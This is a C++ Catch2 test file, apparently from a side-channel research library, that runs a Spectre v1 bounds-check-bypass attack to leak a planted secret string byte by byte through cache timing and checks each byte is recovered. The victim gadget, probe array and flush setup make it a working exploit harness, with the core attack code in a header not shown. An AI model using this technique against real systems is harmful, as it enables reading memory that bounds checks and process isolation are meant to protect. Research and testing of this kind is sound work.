//
// Created by sage on 1/14/21.
//

#include <catch2/catch.hpp>
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>

unsigned int array1_size = 16;
uint8_t unused[64]; // seperate by a cacheline
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64]; // seperate by a cacheline
uint8_t array2[MAX_BYTE*512];

const char* secret = "The cake is a lie!\n";

volatile uint8_t get_elem(size_t x)
{
    // Make this volatile or compiler might optimize out
    volatile uint8_t res = 0;
    if (x < array1_size)
    {
        res &= array2[array1[x]*512];
    }
    return res;
}


TEST_CASE("Spectrev1", "[branch]")
{
    Spectrev1 s(array1,
                array2,
                get_elem,
                []{flush(&array1_size);},
                [](size_t _t){return _t%array1_size;},
                512,
                MAX_TRIES,
                27
    );

    // Need to touch every page
    for (auto i = 0; i < MAX_BYTE; i+=8)
    {
//        asm volatile("PREFETCHW 0 (%0); mfence" ::"R"(array2+i*512));
        array2[i*512] = 1; // 8*512 == 4096
    }

    auto slen = strlen(secret);
    uint8_t val;
    uint8_t *m_addr = reinterpret_cast<uint8_t*>(const_cast<char*>(secret));
    for (size_t i = 0; i  < slen; ++i)
    {
        s.read_byte(m_addr +i, &val);
        printf("0x%02X = %c\n", val, val);
        REQUIRE(val == secret[i]);
    }

}